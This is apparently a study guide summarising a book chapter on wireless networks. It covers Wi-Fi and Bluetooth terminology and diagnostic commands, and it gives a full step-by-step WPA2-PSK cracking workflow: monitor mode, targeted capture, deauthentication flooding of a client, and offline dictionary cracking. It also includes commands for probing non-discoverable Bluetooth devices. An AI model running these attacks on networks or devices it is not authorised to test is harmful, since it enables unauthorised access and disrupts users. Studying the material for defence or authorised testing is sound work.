# Understanding and Inspecting Wireless Networks

## Table of Contents

- [Introduction](#introduction)
- [Wi-Fi Fundamentals & Terminology](#wi-fi-fundamentals--terminology)
- [Basic Wireless Commands & Diagnostics](#basic-wireless-commands--diagnostics)
- [Wi-Fi Reconnaissance & Cracking (Aircrack-ng)](#wi-fi-reconnaissance--cracking-aircrack-ng)
- [Bluetooth Concepts & Architecture](#bluetooth-concepts--architecture)
- [Bluetooth Scanning & Service Discovery (BlueZ)](#bluetooth-scanning--service-discovery-bluez)
- [Key Tips & Source Text Gotchas](#key-tips--source-text-gotchas)
- [Quick Command Chains](#quick-command-chains)
- [Quick Start](#quick-start)

---

## Introduction

Wireless networks operating on IEEE 802.11 (Wi-Fi) and Bluetooth standards transmit radio frequency (RF) signals across open airspaces. Inspecting these wireless environments requires discovering Access Points (APs), analyzing client associations, switching adapters into monitor mode, intercepting password hashes via 4-way handshakes, and enumerating Bluetooth stacks using BlueZ utilities.

---

## Wi-Fi Fundamentals & Terminology

| Parameter / Term | Technical Definition & Operational Parameters |
| --- | --- |
| **AP (Access Point)** | Intermediary infrastructure device connecting wireless clients to a wired network. |
| **SSID (Service Set Identifier)** | Public human-readable name assigned to a wireless network. |
| **ESSID (Extended SSID)** | Identifier spanning multiple APs across an extended wireless Local Area Network (LAN). |
| **BSSID (Basic SSID)** | Unique 48-bit hardware identifier of an AP, matching its physical MAC address. |
| **Channels** | Operates on channels 1–14 globally; legally restricted to **channels 1–11 in the United States**. |
| **Frequency** | Spectrum bands operating primarily at **2.4 GHz** and **5 GHz**. |
| **Power & Range** | Legal US broadcast power is capped at **0.5 Watts** (~300 ft / 100 m range); high-gain antennas extend range up to 20 miles. Signal strength increases proximity to the AP, making exploitation easier. |
| **Security Protocols** | **WEP** (Wired Equivalent Privacy - deeply flawed/easily broken) $\rightarrow$ **WPA** (Wi-Fi Protected Access - legacy) $\rightarrow$ **WPA2-PSK** (Pre-Shared Key standard using a shared password; used by nearly all consumer APs except enterprise Wi-Fi). |
| **Operational Modes** | **Managed** (Client mode joining APs) | **Master** (Act as an AP) | **Monitor** (Promiscuous RF packet sniffing). |

---

## Basic Wireless Commands & Diagnostics

### 1. Interface Identification (`ifconfig`)

```bash
# Display activated interfaces (Wireless interfaces designated as wlan0, wlan1, etc.)
ifconfig

```

### 2. Wireless Interface Status (`iwconfig`)

Inspects wireless-specific parameters, operational status, and signal metrics:

```bash
iwconfig

```

* **Key Parameter Outputs:**
* **IEEE Standard:** e.g., `IEEE 802.11bg`
* **ESSID:** `off/any` (Unconnected) or `"Hackers-Arise"` (Connected)
* **Mode:** `Managed`, `Master`, or `Monitor`
* **Access Point:** `Not-Associated` or target MAC address (e.g., `00:25:9C:97:4F:48`)
* **Tx-Power:** Transmit power (e.g., `20 dBm`)
* **Quality / Signal Level:** e.g., `Link Quality=64/70`, `Signal level=-46 dBm`
* **Thresholds & Limits:** `Retry short limit`, `RTS thr`, `Fragment thr`, `Power Management`



### 3. Access Point Scanning (`iwlist`)

Scans for broadcasting wireless access points within physical range (300–500 feet default):

```bash
iwlist wlan0 scan

```

* **Extracted Data:** Cell Number, BSSID (MAC Address), Channel, Frequency (e.g., `2.412GHz`), Link Quality, Signal Level (`-38 dBm`), Encryption Status (`Encryption key:off` or `on`), and ESSID.

### 4. NetworkManager CLI (`nmcli`)

Command-line interface to the high-level `NetworkManager` daemon.

```bash
# Scan nearby Wi-Fi APs and display SSID, Mode, Channel, Rate, Signal, Bars, and Security
nmcli dev wifi

# Connect to a WPA1/WPA2 password-protected network
nmcli dev wifi connect Hackers-Arise password 12345678

```

> **Activation Output:** Successfully activating a device returns a system Device UUID (e.g., `Device 'wlan0' successfully activated with '394a5bf4-8af4-36f8-49beda6cb530'`).

---

## Wi-Fi Reconnaissance & Cracking (Aircrack-ng)

Cracking WPA2-PSK requires three target variables: **Target BSSID (AP MAC)**, **Client MAC**, and **Channel Number**.

```
                         [Wi-Fi Cracking Workflow]
                                     │
                    1. airmon-ng start wlan0 (Monitor Mode)
                                     │
                    2. airodump-ng wlan0mon (Find Target)
                                     │
                    3. Target Channel Capture (Terminal 1)
                                     │
                    4. Deauth Client Attack (Terminal 2)
                                     │
                    5. WPA2 Handshake Hash Captured
                                     │
                    6. Dictionary Attack (Terminal 3)

```

### Step 1: Enable Monitor Mode (`airmon-ng`)

Puts the wireless card into promiscuous mode to capture all RF traffic.

```bash
# Terminate interfering processes (if tools fail after short periods)
airmon-ng check kill

# Enable monitor mode on interface (Renames wlan0 to wlan0mon)
airmon-ng start wlan0

# Stop monitor mode
airmon-ng stop wlan0mon

```

### Step 2: Broad Spectrum Traffic Capture (`airodump-ng`)

```bash
airodump-ng wlan0mon

```

#### Screen Split Layout Breakdown

* **Upper Section (Broadcasting APs):**
* `BSSID`: MAC address of AP
* `PWR`: Signal strength
* `Beacons`: Announcement frames sent by AP
* `#Data` / `#/s`: Captured data packets / Throughput rate
* `CH`: Operating channel (1–14)
* `MB`: Speed limit (e.g., `54e`)
* `ENC` / `CIPHER` / `AUTH`: Encryption (`WPA2`), Cipher (`CCMP`), Authentication (`PSK`)
* `ESSID`: Network name


* **Lower Section (Client Devices):**
* `BSSID`: AP MAC the client is associated with (or `(not associated)`)
* `Station`: Physical MAC address of the client device
* `Rate` / `Lost` / `Frames` / `Probe`: Transmission metrics and searched SSIDs



### Step 3: WPA2-PSK Handshake Attack (3-Terminal Sequence)

#### Terminal 1: Capture Target AP Packets

```bash
# Capture packets on channel 10 for target BSSID and output to file prefix
airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon

```

#### Terminal 2: Inject Deauthentication Frames

```bash
# Send 100 deauth frames to disconnect client and force a 4-way re-authentication handshake
aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22 -c A0:A3:E2:44:7C:E5 wlan0mon

```

*(Once client reconnects, `WPA handshake: 01:01:AA:BB:CC:22` appears in the top-right of Terminal 1).*

#### Terminal 3: Offline Dictionary Crack

```bash
# Crack the captured password hash using a wordlist
aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hackers-ArisePSK.cap

```

---

## Bluetooth Concepts & Architecture

* **Protocol & Spectrum:** Low-power, short-range RF standard operating at **2.4–2.485 GHz**.
* **Security Mechanism:** Uses Frequency Hopping Spread Spectrum (FHSS) at **1,600 hops per second**.
* **History:** Developed in 1994 by Ericsson Corp. (Sweden); named after 10th-century Danish King Harald Bluetooth.
* **Operating Range:** Minimum 10 meters; manufacturer implementations reach 100+ meters (further with directional antennas).
* **Pairing Process:** Devices pair when in **Discoverable Mode**, broadcasting:
1. Device Name
2. Device Class
3. List of Services
4. Technical Information


* **Authentication:** Pairing generates and stores a shared **Link Key** for future connections.
* **Addressing:** Identified by a unique **48-bit hardware address** (BD Address).

---

## Bluetooth Scanning & Service Discovery (BlueZ)

Linux uses the **BlueZ** protocol stack to manage Bluetooth devices.

```bash
# Install BlueZ suite (if missing)
apt-get install bluez

```

### BlueZ Toolset Summary

| Utility | Primary Purpose |
| --- | --- |
| `hciconfig` | Configures and queries local Bluetooth host adapters (similar to `ifconfig`). |
| `hcitool` | Scans, inquires, and extracts device IDs, names, classes, and clock offsets. |
| `sdptool` | Queries Service Discovery Protocol (SDP) records to list target capabilities. |
| `l2ping` | Sends L2CAP pings to test physical reachability of target MAC addresses. |
| `hcidump` | Sniffs and parses raw Bluetooth HCI data packets over the air. |

### Execution Workflow

```bash
# 1. Inspect local Bluetooth adapter state
hciconfig

# 2. Enable local HCI adapter (hci0)
hciconfig hci0 up

# 3. Scan for discoverable Bluetooth devices (Returns MAC and Name)
hcitool scan

# 4. Perform low-level inquiry (Returns MAC, Clock Offset, and Hex Device Class)
hcitool inq

```

* **Class Code Lookup:** Hex class output (e.g., `class:0x5a020c`) indicates device type. Decode using the [Bluetooth SIG Service Discovery Page](https://www.google.com/search?q=https://www.bluetooth.org/en-us/specification/assigned-numbers/service-discovery/).

```bash
# 5. Enumerate SDP services (Works even if target is NOT in discoverable mode)
sdptool browse 76:6E:46:63:72:66

```

* **Service Signals:** Identifies protocols such as `L2CAP` (Logical Link Control & Adaptation Protocol) and `ATT` (Low Energy Attribute Protocol used in IoT/BLE devices).

```bash
# 6. Test connection reachability via L2CAP ping (Works regardless of discoverable status)
l2ping 76:6E:46:63:72:66 -c 3

# 7. Sniff Bluetooth communications
hcidump

```

---

## Key Tips & Source Text Gotchas

* **Source Text Filename Typo** — In the book's Chapter 14 cracking section, the capture file is created as `Hackers-ArisePSK` in Terminal 1, but referenced as `Hacker-ArisePSK.cap` (missing the 's') in Terminal 3. Ensure your file parameters match your output name (`<prefix>-01.cap`).
* **Non-Discoverable Target Probe** — Target Bluetooth devices do **not** need to be in discoverable mode to run `sdptool browse` or `l2ping` as long as you know their 48-bit MAC address.
* **Interface Renaming** — Executing `airmon-ng start wlan0` renames the interface to `wlan0mon`. Always use `wlan0mon` for subsequent `airodump-ng` and `aireplay-ng` commands.
* **Enterprise Exception** — Enterprise Wi-Fi uses 802.1X authentication servers rather than WPA2-PSK pre-shared keys.

---

## Quick Command Chains

```bash
# Full Wi-Fi Monitor Mode Setup
airmon-ng check kill && airmon-ng start wlan0

# WPA2 Handshake Capture Command
airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon

# Bluetooth Full Recon Loop
hciconfig hci0 up && hcitool scan && hcitool inq

# Probe Target Device Services and Distance
sdptool browse <TARGET_MAC> && l2ping <TARGET_MAC> -c 3

```

---

## Quick Start

Check Interfaces (`iwconfig` / `hciconfig`) $\rightarrow$ Bring Adapter Up / Monitor (`airmon-ng start wlan0` / `hciconfig hci0 up`) $\rightarrow$ Run Recon Scan (`airodump-ng wlan0mon` / `hcitool scan`) $\rightarrow$ Capture Handshake / Enumerate SDP (`aireplay-ng` + `airodump-ng` / `sdptool browse`) $\rightarrow$ Execute Attack (`aircrack-ng` / `l2ping`)
